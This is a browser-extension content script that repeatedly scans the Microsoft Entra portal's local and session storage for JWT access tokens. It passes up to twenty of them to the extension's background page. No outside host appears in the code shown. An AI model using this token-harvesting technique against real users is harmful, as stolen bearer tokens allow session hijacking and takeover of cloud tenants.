(() => {
  const JWT_PATTERN = /\b[A-Za-z0-9_-]{1,2000}\.[A-Za-z0-9_-]{1,8000}\.[A-Za-z0-9_-]{1,2000}\b/g;
  const MAX_STORAGE_VALUE_LENGTH = 300000;
  const MAX_TOKENS = 20;
  const MAX_JSON_DEPTH = 5;
  const MAX_ATTEMPTS = 45;
  let attempts = 0;

  function scan() {
    attempts += 1;
    const tokens = collectPortalTokens();
    if (tokens.length) {
      chrome.runtime.sendMessage(
        {
          action: "capturePortalTokens",
          tokens,
          source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
        },
        () => {
          void chrome.runtime.lastError;
        }
      );
    }
    if (attempts >= MAX_ATTEMPTS) {
      clearInterval(interval);
    }
  }

  function collectPortalTokens() {
    const tokens = new Set();
    collectStorageTokens(window.localStorage, tokens);
    collectStorageTokens(window.sessionStorage, tokens);
    return [...tokens].slice(0, MAX_TOKENS);
  }

  function collectStorageTokens(storage, tokens) {
    try {
      for (let index = 0; index < storage.length && tokens.size < MAX_TOKENS; index += 1) {
        const key = storage.key(index);
        if (!key) continue;
        addTokensFromValue(storage.getItem(key), tokens);
      }
    } catch {
      // Some portal frames may deny storage access. The next scan can still succeed from another frame.
    }
  }

  function addTokensFromValue(value, tokens, depth = 0) {
    if (tokens.size >= MAX_TOKENS || value === undefined || value === null || depth > MAX_JSON_DEPTH) {
      return;
    }
    if (typeof value === "string") {
      addTokensFromText(value, tokens);
      return;
    }
    if (Array.isArray(value)) {
      for (const item of value) {
        addTokensFromValue(item, tokens, depth + 1);
      }
      return;
    }
    if (typeof value === "object") {
      for (const item of Object.values(value)) {
        addTokensFromValue(item, tokens, depth + 1);
      }
    }
  }

  function addTokensFromText(value, tokens) {
    if (!value || value.length > MAX_STORAGE_VALUE_LENGTH || tokens.size >= MAX_TOKENS) {
      return;
    }
    for (const match of value.matchAll(JWT_PATTERN)) {
      tokens.add(match[0]);
      if (tokens.size >= MAX_TOKENS) {
        return;
      }
    }
    const parsed = parseJson(value);
    if (parsed !== undefined) {
      addTokensFromValue(parsed, tokens, 1);
    }
  }

  function parseJson(value) {
    const trimmed = value.trim();
    if (!trimmed.startsWith("{") && !trimmed.startsWith("[")) {
      return undefined;
    }
    try {
      return JSON.parse(trimmed);
    } catch {
      return undefined;
    }
  }

  scan();
  const interval = setInterval(scan, 2000);
  window.addEventListener("hashchange", scan);
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden) scan();
  });
})();
